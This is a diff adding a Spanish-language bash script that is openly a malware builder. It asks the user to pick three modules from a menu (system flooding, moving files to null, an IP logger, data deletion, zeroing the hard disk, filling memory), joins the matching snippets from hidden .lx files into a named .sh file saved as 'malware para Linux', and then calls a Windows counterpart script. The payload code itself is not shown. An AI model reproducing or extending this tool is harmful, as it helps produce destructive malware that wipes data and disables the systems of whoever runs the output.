@@ -1,0 +1,47 @@
+mkdir Creacion/Linux
+bash .banner
+echo "¿Que quieres que incluya el malware? 1/3"
+echo ""
+echo "1)Saturar Linux"
+echo "2)Mover archivos a null"
+echo "3)Iplogger"
+echo "4)Borrar datos"
+echo "5)Discoduro 0"
+echo "6)Rellenar Memoria"
+echo ""
+read input
+bash .banner
+echo "¿Que quieres que incluya el malware? 2/3"
+echo ""
+echo "1)Saturar Linux"
+echo "2)Mover archivos a null"
+echo "3)Iplogger"
+echo "4)Borrar datos"
+echo "5)Discoduro 0"
+echo "6)Rellenar Memoria"
+echo ""
+read input1
+bash .banner
+echo "¿Que quieres que incluya el malware? 3/3"
+echo ""
+echo "1)Saturar Linux"
+echo "2)Mover archivos a null"
+echo "3)Iplogger"
+echo "4)Borrar datos"
+echo "5)Discoduro 0"
+echo "6)Rellenar Memoria"
+echo ""
+read input2
+mal=$(cat .lx/.$input .lx/.$input1 .lx/.$input2)
+bash .banner
+echo "Introduce el nombre de tu malware:"
+read input3
+echo "$mal" |& tee $input3.sh
+mv $input3.sh Creacion/Linux/$input3.sh
+bash .banner
+echo "Malware para Linux Creado exitosamente y guardado en:"
+echo "[Creacion/Linux/$input3.sh]"
+echo ""
+echo "Presiona una tecla para continuar..."
+read input4
+bash Winmaker.sh
